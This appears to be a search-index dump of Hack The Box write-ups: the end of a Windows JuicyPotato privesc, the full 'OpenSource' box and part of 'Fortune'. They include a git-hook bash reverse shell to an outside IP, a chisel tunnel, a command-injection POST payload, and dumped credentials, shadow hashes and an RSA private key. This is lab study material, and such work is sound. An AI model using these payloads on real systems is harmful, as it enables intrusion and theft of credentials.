C:&gt; systeminfo — snip — OS Name: Microsoft Windows Server 2008 R2 Datacenter\nUpload JuicyPotato, grab a random CLSID (from JuicyPotato’s GitHub) and exploit: C:&gt; copy \\10.10.14.8-share.exe . C:&gt; JuicyPotato.exe -l 1444 -p c:.exe -a “/c \\10.10.14.8-share-privesc.bat” -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}\nThe command doesn’t provide any output, feel like something is wrong with the PS session. Try directly from drupalgeddon instead.\ndrupalgeddon2&gt;&gt; C:.exe -l 1444 -p c:.exe -a “/c \\10.10.14.8-share-privesc.bat” -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820} Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1444 …. [+] authresult 0 {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\n[+] CreateProcessWithTokenW OK\n[root:/srv/pub-share]# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 50541 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32&gt;whoami\n  nt authority\\system\n\nC:\\Windows\\System32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt.txt\n  4bf12b963da1b30cc93496f617f7ba7c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\ndrupalgeddon2: https://github.com/dreadlocked/Drupalgeddon2\nJuicyPotato: https://github.com/ohpe/juicy-potato\nCLSIDs Windows 2008 R2: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise"
  },
  {
    "objectID": "posts/2022-05-24-htb-writeup-opensource/2022-05-24-htb-writeup-opensource.html",
    "href": "posts/2022-05-24-htb-writeup-opensource/2022-05-24-htb-writeup-opensource.html",
    "title": "OpenSource - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  opensource nmap -Pn -n -p- 10.129.69.218 -v\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n3000/tcp filtered ppp\n\n➜  opensource nmap -Pn -n -sCV -p22,80,3000 10.129.69.218\nPORT     STATE    SERVICE VERSION\n22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)\n|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)\n|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)\n80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 23 May 2022 17:53:44 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 5316\n|     Connection: close\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"UTF-8\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;\n|     &lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/vendor/popper/popper.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt;\n|     &lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/&gt;\n|     &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/&gt;\n|     &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/&gt;\n|     &lt;link rel=\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 23 May 2022 17:53:44 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: GET, OPTIONS, HEAD\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest: \n|     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 400&lt;/p&gt;\n|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n|_http-title: upcloud - Upload files for Free!\n|_http-server-header: Werkzeug/2.1.2 Python/3.10.3\n3000/tcp filtered ppp\n\n➜  opensource sudo nmap -sU --top-port=50 --open 10.129.69.218\nPORT   STATE         SERVICE\n68/udp open|filtered dhcpc\nwebanalyze:\n➜  webanalyze ./webanalyze -host http://10.129.69.218\nhttp://10.129.69.218 (0.1s):\n    Python, 3.10.3 (Programming languages)\n    Bootstrap,  (UI frameworks)\n    Flask, 2.1.2 (Web frameworks, Web servers)\n    Python,  (Programming languages)\nVisit the webpage and we find a site where we can upload files without authentication. The code is OpenSource and we are able to download it all.\nDownload the code and extract it. First thing we see is a .git directory, lets look for secrets there!\n➜  logs git:(public) cat HEAD \n0000000000000000000000000000000000000000 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser &lt;gituser@local&gt; 1651146317 +0200  commit (initial): initial\nee9d9f1ef9156c787d53074493e39ae364cd1e05 0000000000000000000000000000000000000000 gituser &lt;gituser@local&gt; 1651146317 +0200  Branch: renamed refs/heads/master to refs/heads/public\n0000000000000000000000000000000000000000 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser &lt;gituser@local&gt; 1651146317 +0200  Branch: renamed refs/heads/master to refs/heads/public\nee9d9f1ef9156c787d53074493e39ae364cd1e05 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser &lt;gituser@local&gt; 1651146352 +0200  checkout: moving from public to dev\nee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820 gituser &lt;gituser@local&gt; 1651146376 +0200  commit: updated\na76f8f75f7a4a12b706b0cf9c983796fa1985820 be4da71987bbbc8fae7c961fb2de01ebd0be1997 gituser &lt;gituser@local&gt; 1651146414 +0200  commit: added gitignore\nbe4da71987bbbc8fae7c961fb2de01ebd0be1997 c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser &lt;gituser@local&gt; 1651146444 +0200  commit: ease testing\nc41fedef2ec6df98735c11b2faf1e79ef492a0f3 ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser &lt;gituser@local&gt; 1651146451 +0200  checkout: moving from dev to public\nee9d9f1ef9156c787d53074493e39ae364cd1e05 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser &lt;gituser@local&gt; 1651146955 +0200  commit: clean up dockerfile for production use\n2c67a52253c6fe1f206ad82ba747e43208e8cfd9 c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser &lt;gituser@local&gt; 1651147059 +0200  checkout: moving from public to dev\nc41fedef2ec6df98735c11b2faf1e79ef492a0f3 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser &lt;gituser@local&gt; 1651150220 +0200  checkout: moving from dev to public\n➜  logs git:(public) git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820\n[... snip ...]\n+++ b/app/.vscode/settings.json\n@@ -0,0 +1,5 @@\n+{\n+  \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",\n+  \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",\n+  \"http.proxyStrictSSL\": false\n+}\nWe find a set of creds, dev01:Soulless_Developer#2022, although it’s towards an IP and port that we don’t recognize. Lets look if it’s the same for SSH.\n➜  opensource ssh dev01@10.129.69.218\n[... snip ...]\ndev01@10.129.69.218: Permission denied (publickey).\nTrying to download a file that doesn’t exist they leak the PATH and a secret key in the error response, however /console is locked with a PIN so we can’t get RCE there..\n## REQUEST\nGET /uploads/asdf.py HTTP/1.1\nHost: 10.129.69.218\n\n## RESPONSE\n[... snip ...]\n  &lt;head&gt;\n    &lt;title&gt;FileNotFoundError: [Errno 2] No such file or directory: '/app/public/uploads/asdauthorized_keys'\n // Werkzeug Debugger&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"?__debugger__=yes&amp;cmd=resource&amp;f=style.css\"&gt;\n    &lt;link rel=\"shortcut icon\"\n        href=\"?__debugger__=yes&amp;cmd=resource&amp;f=console.png\"&gt;\n    &lt;script src=\"?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js\"&gt;&lt;/script&gt;\n    &lt;script&gt;\n      var CONSOLE_MODE = false,\n          EVALEX = true,\n          EVALEX_TRUSTED = false,\n          SECRET = \"E7MAYp3KlTA309Ic1hST\";\n    &lt;/script&gt;\n  &lt;/head&gt;\n\n\n\n\n\n\n### Step 2 Instead, we can focus on the source code, especially the upload function in views.py\n\n\n\n\n### Step 3 We’re in a docker container.. both capsh and getcap is unavailable, we don’t have permissions to mount to the host file system. We are unable to SSH to the host with found creds.. but when using wget to enumerate http://172.17.0.1 we find a webfront where user dev01 is a member - http://opensource.htb:3000/dev01.\n\n\nbash ➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 3333 -reverse 2022/05/24 10:26:12 server: Reverse tunnelling enabled 2022/05/24 10:26:12 server: Fingerprint 0w1VYvw5UN5G517RVqpm0jScfuRrA5gZN3N7h5iXI10= 2022/05/24 10:26:12 server: Listening on http://0.0.0.0:3333\n\n\nbash /app/public/uploads # ./chisel_1.7.7_linux_amd64 client 10.10.15.17:3333 R:127.0.0.1:3000:172.17.0.1:3000 2022/05/24 08:26:43 client: Connecting to ws://10.10.15.17:3333 2022/05/24 08:26:43 client: Connected (Latency 43.290943ms)\n\n\n\n\n\nLogin with previously found credentials, dev01:Soulless_Developer#2022, and grab the private key.\n\n\n\n\n\n```bash ➜ opensource chmod 400 id_rsa ➜ opensource ssh dev01@10.129.70.252 -i id_rsa dev01@opensource:~$ id && hostname uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) opensource\n\n\ndev01@opensource:~$ pwd /home/dev01\n\n\ndev01@opensource:~$ cat user.txt 48e3b2ed54ab95e7339d32f60f3f8f46 ```\n\n\n\n\n\n\nROOT\n\nStep 1\nWe are unable to run sudo -l, and the groups look fine. Reading about GiTea vulnerabilities a lot of articles point towards an authenticated RCE through Git Hooks.\nLooking in our web-gui we don’t seem to have that option available. \nHere’s an vulnerable example: \nBut, we don’t need the web-gui, we have the .git in our home directory as user dev01.\ndev01@opensource:~/.git$ ls -al\ntotal 60\ndrwxrwxr-x  8 dev01 dev01 4096 May 24 11:18 .\ndrwxr-xr-x  8 dev01 dev01 4096 May 24 11:12 ..\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches\n-rw-r--r--  1 dev01 dev01   22 May 24 11:12 COMMIT_EDITMSG\n-rw-rw-r--  1 dev01 dev01  269 May 24 11:18 config\n-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description\n-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD\n-rw-r--r--  1 dev01 dev01   21 May 16 12:50 HEAD\ndrwxrwxr-x  2 dev01 dev01 4096 May 24 11:12 hooks\n-rw-r--r--  1 root  root  1066 May 24 11:13 index\ndrwxrwxr-x  2 dev01 dev01 4096 May 24 10:34 info\ndrwxr-xr-x  3 dev01 dev01 4096 May 24 10:34 logs\ndrwxrwxr-x 10 dev01 dev01 4096 May 24 11:13 objects\n-rw-rw-r--  1 dev01 dev01  232 May 24 10:34 packed-refs\ndrwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs\n\ndev01@opensource:~/.git/hooks$ ls -al\ntotal 60\ndrwxrwxr-x 2 dev01 dev01 4096 May 24 11:12 .\ndrwxrwxr-x 8 dev01 dev01 4096 May 24 11:19 ..\n-rwxrwxr-x 1 dev01 dev01  478 Mar 23 01:18 applypatch-msg.sample\n-rwxrwxr-x 1 dev01 dev01  896 Mar 23 01:18 commit-msg.sample\n-rwxrwxr-x 1 dev01 dev01 3327 Mar 23 01:18 fsmonitor-watchman.sample\n-rwxrwxr-x 1 dev01 dev01  189 Mar 23 01:18 post-update.sample\n-rwxrwxr-x 1 dev01 dev01  424 Mar 23 01:18 pre-applypatch.sample\n-rwxrwxr-x 1 dev01 dev01 1642 Mar 23 01:18 pre-commit.sample\n-rwxrwxr-x 1 dev01 dev01 1492 Mar 23 01:18 prepare-commit-msg.sample\n-rwxrwxr-x 1 dev01 dev01 1348 Mar 23 01:18 pre-push.sample\n-rwxrwxr-x 1 dev01 dev01 4898 Mar 23 01:18 pre-rebase.sample\n-rwxrwxr-x 1 dev01 dev01  544 Mar 23 01:18 pre-receive.sample\n-rwxrwxr-x 1 dev01 dev01 3610 Mar 23 01:18 update.sample\nGit Hooks are scripts executed by the server when a commit is pushed to a repository. There are no pre-configured hooks, and for us to escalate privileges something has to be pushed / commited / updated. Upload pspy64 to the victim and run it.\ndev01@opensource:/dev/shm$ ./pspy64\n[... snip ...]\n2022/05/24 09:02:01 CMD: UID=0    PID=11447  | git commit -m Backup for 2022-05-24 \n2022/05/24 09:02:01 CMD: UID=0    PID=11449  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git \n2022/05/24 09:02:01 CMD: UID=0    PID=11448  | git push origin main \nIt seems like backups are commited frequently by UID 0 (root), we should be able to exploit this by creating our own pre-commit / commit-msg / prepare-commit-msg script.\ndev01@opensource:~/.git/hooks$ ls -al pre-commit\n-rwxrwxr-x 1 dev01 dev01 54 May 24 11:12 pre-commit\n\ndev01@opensource:~/.git/hooks$ cat pre-commit\n#!/bin/bash\nbash -i &gt;& /dev/tcp/10.10.15.17/4488 0&gt;&1\nWait for the backup to be made and we should get our reverse shell!\n➜  chisel_1.7.7 nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.15.17] from (UNKNOWN) [10.129.70.252] 43612\nbash: cannot set terminal process group (21874): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@opensource:/home/dev01# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@opensource:/home/dev01# cat /root/root.txt\n6d931e05a808f004c7ec976de9be27ff\n\nroot@opensource:/home/dev01# cat /etc/shadow\nroot:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::\ndev01:$6$KxPkBXel$7cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC/j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh/:19073:0:99999:7:::\n\nroot@opensource:/home/dev01# cat /root/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n\n\n\n\nReferences\nGiTea Hooks RCE https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce https://muirlandoracle.co.uk/2020/09/04/year-of-the-dog-write-up/ https://hngnh.com/posts/DevGuru-CTF-Writeup/"
  },
  {
    "objectID": "posts/2019-06-25-htb-writeup-fortune/2019-06-25-htb-writeup-fortune.html",
    "href": "posts/2019-06-25-htb-writeup-fortune/2019-06-25-htb-writeup-fortune.html",
    "title": "Fortune - Hack The Box",
    "section": "",
    "text": "Basic enum shows port 22,80,443. 443 har cert error, 80 anropar en db med fortunes, 22 saknar vi creds för\ndirb visar inget spännande. Kör en crawl/audit i burp på http://10.10.10.127 och ser att den är vulnerable för os command- och code injection.\nSkickar POST Request till Repeater och söker mig runt i burken efter cert filer och användare:\nPOST /select HTTP/1.1\nHost: 10.10.10.127\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nReferer: http://10.10.10.127/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\ndb=fortune|ls -al /home\nHittar 3 användare: bob, charlie och nfsuser. Bob har massor av cert-filer vilket känns intressant. Charlie kommer man ej åt så chansar att user.txt finns här. nfsuser har en mer eller mindre tom hemkatalog\nPlockar hem alla filer från bob så jag har följade filstruktur:\n$ tree\n.\n├── bob\n│   ├── ca\n│   │   ├── certs\n│   │   │   └── ca.cert.pem\n│   │   ├── index.txt\n│   │   ├── index.txt.attr\n│   │   ├── intermediate\n│   │   │   ├── certs\n│   │   │   │   ├── ca-chain.cert.pem\n│   │   │   │   ├── fortune.htb.cert.pem\n│   │   │   │   ├── intermediate.cert.pem\n│   │   │   │   └── intermediate.cert.srl\n│   │   │   ├── crlnumber\n│   │   │   ├── csr\n│   │   │   │   ├── fortune.htb.csr.pem\n│   │   │   │   └── intermediate.csr.pem\n│   │   │   ├── index.txt\n│   │   │   ├── newcerts\n│   │   │   │   └── 1000.pem\n│   │   │   ├── openssl.cnf\n│   │   │   └── private\n│   │   │       └── intermediate.key.pem\n│   │   ├── newcerts\n│   │   │   └── 1000.pem\n│   │   ├── openssl.cnf\n│   │   ├── serial\n│   │   └── serial.old\n│   └── dba\n│       └── authpf.sql\nFör enkelhet skapa en dir som heter custom-certs utanför dir bob. Skapa custom cert-key samt request för bob och charlie (subj-info tagen från bob/ca/index.txt samt bob/ca/intermediate/index.txt) i nyskapade custom-cert dir’en:\nopenssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj \"/C=CA/ST=ON/O=Fortune Co HTB/CN=Fortune Intermediate CA/emailAddress=bob@fortune.htb\"\n\nopenssl req -newkey rsa:4096 -keyout charlie_key.pem -out charlie_csr.pem -nodes -days 365 -subj \"/C=CA/ST=ON/O=Fortune Co HTB/CN=fortune.htb/emailAddress=charlie@fortune.htb\"\nDöp om filerna för enkelhetensskull:\nmv bob_key.pem bob.key && mv bob_csr.pem bob.csr\nmv charlie_key.pem charlie.key && mv charlie_csr.pem charlie.csr\n$ ls -al\ntotal 24\ndrwxr-xr-x 1 root root  108 Jun 26 14:25 .\ndrwxr-xr-x 1 root root  196 Jun 26 14:10 ..\n-rw-r--r-- 1 root root 1716 Jun 26 14:11 bob.csr\n-rw------- 1 root root 3272 Jun 26 14:11 bob.key\n-rw-r--r-- 1 root root 1704 Jun 26 14:12 charlie.csr\n-rw------- 1 root root 3272 Jun 26 14:12 charlie.key\nSignera certificate requests med intermediate.key (pwd = htb/machines/fortune/custom-certs):\nopenssl x509 -req -days 365 -in bob.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out bob.crt\n\nopenssl x509 -req -days 365 -in charlie.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out charlie.crt\nKonvertera .crt till .p12 för att kunna använda dem i Firefox, lämna password blankt (pwd = htb/machines/fortune/custom-certs):\nopenssl pkcs12 -export -out bob.p12 -inkey bob.key -in bob.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem\nopenssl pkcs12 -export -out charlie.p12 -inkey charlie.key -in charlie.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem\nImportera charlie.p12 i Firefox och surfa in på https://10.10.10.127 för att få SSH key pair\noptions -&gt; preferences -&gt; advanced -&gt; certificates -&gt; view certificates -&gt; your certificates -&gt; import -&gt; select charlie.p12 -&gt; ok\nTryck på “generate” och spara ner public key i /root/.ssh/id_rsa.pub (perm 644) samt private i /root/.ssh/id_rsa (perm 600)\nLogga in som nfsuser med public key. ssh nfsuser@10.10.10.127"
  },
  {
    "objectID": "posts/2019-06-25-htb-writeup-fortune/2019-06-25-htb-writeup-fortune.html#enumeration",
    "href": "posts/2019-06-25-htb-writeup-fortune/2019-06-25-htb-writeup-fortune.html#enumeration",
    "title": "Fortune - Hack The Box",
    "section": "",
    "text": "Basic enum shows port 22,80,443. 443 har cert error, 80 anropar en db med fortunes, 22 saknar vi creds för\ndirb visar inget spännande. Kör en crawl/audit i burp på http://10.10.10.127 och ser att den är vulnerable för os command- och code injection.\nSkickar POST Request till Repeater och söker mig runt i burken efter cert filer och användare:\nPOST /select HTTP/1.1\nHost: 10.10.10.127\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nReferer: http://10.10.10.127/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\ndb=fortune|ls -al /home\nHittar 3 användare: bob, charlie och nfsuser. Bob har massor av cert-filer vilket känns intressant. Charlie kommer man ej åt så chansar att user.txt finns här. nfsuser har en mer eller mindre tom hemkatalog\nPlockar hem alla filer från bob så jag har följade filstruktur:\n$ tree\n.\n├── bob\n│   ├── ca\n│   │   ├── certs\n│   │   │   └── ca.cert.pem\n│   │   ├── index.txt\n│   │   ├── index.txt.attr\n│   │   ├── intermediate\n│   │   │   ├── certs\n│   │   │   │   ├── ca-chain.cert.pem\n│   │   │   │   ├── fortune.htb.cert.pem\n│   │   │   │   ├── intermediate.cert.pem\n│   │   │   │   └── intermediate.cert.srl\n│   │   │   ├── crlnumber\n│   │   │   ├── csr\n│   │   │   │   ├── fortune.htb.csr.pem\n│   │   │   │   └── intermediate.csr.pem\n│   │   │   ├── index.txt\n│   │   │   ├── newcerts\n│   │   │   │   └── 1000.pem\n│   │   │   ├── openssl.cnf\n│   │   │   └── private\n│   │   │       └── intermediate.key.pem\n│   │   ├── newcerts\n│   │   │   └── 1000.pem\n│   │   ├── openssl.cnf\n│   │   ├── serial\n│   │   └── 